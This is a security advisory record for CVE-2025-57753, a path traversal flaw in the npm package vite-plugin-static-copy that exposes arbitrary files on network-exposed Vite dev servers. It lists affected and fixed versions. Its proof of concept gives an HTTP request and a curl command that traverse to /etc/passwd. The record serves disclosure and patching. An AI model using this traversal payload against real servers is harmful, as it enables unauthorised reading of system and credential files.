advisory_id: GHSA-pp7p-q8fx-2968
datasource_id: github_osv_importer_v2/GHSA-pp7p-q8fx-2968
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-pp7p-q8fx-2968/GHSA-pp7p-q8fx-2968.json
aliases:
  - CVE-2025-57753
summary: "vite-plugin-static-copy files not included in `src` are possible to access with a\
  \ crafted request\n### Summary\n\nFiles not included in `src` was possible to access with\
  \ a crafted request.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to\
  \ the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\
  \ are affected.\n\nArbitrary files can be disclosed by exploiting this vulnerability.\n\n\
  ### Details\n\nConsider the following configuration in used by `vite.config.ts`:\n\n```ts\n\
  import { defineConfig } from 'vite'\nimport { viteStaticCopy } from 'vite-plugin-static-copy'\n\
  \nexport default defineConfig({\n    plugins: [\n      viteStaticCopy({\n        targets:\
  \ [\n          {\n            src: \"./public/images\",\n            dest: \"./\",\n     \
  \     },\n        ],\n      }),\n    ],\n  });\n```\n\nThe files under the `./public/images`\
  \ is only expected to be served. Abusing this vulnerability, an attacker can access arbitrary\
  \ files on the filesystem.\n\n### PoC\nI've attached a demo app to showcase the bug.\n\nRun\
  \ it with `npm run dev` and issue the following HTTP request\n\n```\nGET /static/images/../../../../../../../etc/passwd\
  \ HTTP/1.1\nHost: localhost:3001\nContent-Length: 2\n```\nOR \n```\ncurl --path-as-is -i -s\
  \ -k -X $'GET' \\\n    -H $'Host: localhost:3001' -H $'Content-Length: 2' \\\n    --data-binary\
  \ $'\\x0d\\x0a' \\\n    $'http://localhost:3001/static/images/../../../../../../../etc/passwd'\n\
  ```\nObserve that the `/etc/passwd` file is included in the response.\n\n<img width=\"1289\"\
  \ height=\"449\" alt=\"Screenshot 2025-08-16 at 10 27 11â€¯PM\" src=\"https://github.com/user-attachments/assets/4de12612-7b86-44d7-a403-c76f12832e37\"\
  \ />"
impacted_packages:
  - purl: pkg:npm/vite-plugin-static-copy
    affected_versions: vers:npm/<=3.1.1
    fixed_versions: vers:npm/3.1.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vite-plugin-static-copy
    affected_versions: vers:npm/<=2.3.1
    fixed_versions: vers:npm/2.3.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.0'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-pp7p-q8fx-2968/GHSA-pp7p-q8fx-2968.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-22
references:
  - url: https://github.com/sapphi-red/vite-plugin-static-copy
    reference_type:
    reference_id:
  - url: https://github.com/sapphi-red/vite-plugin-static-copy/commit/0bc6b49ed72b46eecfc9682045f4b46a19694969
    reference_type:
    reference_id:
  - url: https://github.com/sapphi-red/vite-plugin-static-copy/commit/4627afb8582083eab733881d3d974e1c1f23997d
    reference_type:
    reference_id:
  - url: https://github.com/sapphi-red/vite-plugin-static-copy/releases/tag/vite-plugin-static-copy%402.3.2
    reference_type:
    reference_id:
  - url: https://github.com/sapphi-red/vite-plugin-static-copy/releases/tag/vite-plugin-static-copy%403.1.2
    reference_type:
    reference_id:
  - url: https://github.com/sapphi-red/vite-plugin-static-copy/security/advisories/GHSA-pp7p-q8fx-2968
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-57753
    reference_type:
    reference_id: CVE-2025-57753
